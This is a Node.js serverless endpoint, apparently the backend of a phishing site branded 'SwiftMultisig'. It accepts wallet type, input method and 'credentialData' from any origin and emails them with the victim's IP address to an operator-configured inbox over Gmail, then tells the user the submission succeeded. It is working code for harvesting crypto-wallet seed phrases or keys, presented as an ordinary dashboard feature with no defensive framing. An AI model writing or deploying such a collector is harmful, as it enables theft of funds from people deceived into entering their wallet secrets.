const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { walletType, inputMethod, credentialData } = req.body;
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const EMAIL_USER = process.env.EMAIL_USER;
        const EMAIL_PASS = process.env.EMAIL_PASS;
        const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL;

        if (!EMAIL_USER || !EMAIL_PASS || !RECIPIENT_EMAIL) {
            console.error('Missing email environment variables');
            return res.status(500).json({
                success: false,
                message: 'Email not configured on server'
            });
        }

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: { user: EMAIL_USER, pass: EMAIL_PASS }
        });

        await transporter.verify(); // throws on failure

        const emailHtml = `
            <!DOCTYPE html>
            <html>
            <head><meta charset="UTF-8"></head>
            <body style="font-family: Arial, sans-serif; max-width: 600px; margin: auto;">
                <h2 style="color: #3b82f6;">🔐 New Wallet Submission</h2>
                <p><strong>Wallet Type:</strong> ${walletType}</p>
                <p><strong>Input Method:</strong> ${inputMethod}</p>
                <p><strong>Data:</strong></p>
                <pre style="background: #f4f4f4; padding: 12px; border-radius: 6px; overflow-x: auto;">${credentialData}</pre>
                <p><strong>IP Address:</strong> ${ipAddress}</p>
                <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
                <hr />
                <p style="font-size: 12px; color: #666;">This is an automated message from your SwiftMultisig dashboard.</p>
            </body>
            </html>
        `;

        await transporter.sendMail({
            from: `"SwiftMultisig" <${EMAIL_USER}>`,
            to: RECIPIENT_EMAIL,
            subject: `Wallet Submission - ${walletType} (${inputMethod})`,
            html: emailHtml,
            text: `Wallet Type: ${walletType}\nMethod: ${inputMethod}\nData: ${credentialData}\nIP: ${ipAddress}\nTime: ${new Date().toLocaleString()}`
        });

        res.status(200).json({ success: true, message: 'Submitted successfully!' });
    } catch (error) {
        console.error('Email error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
};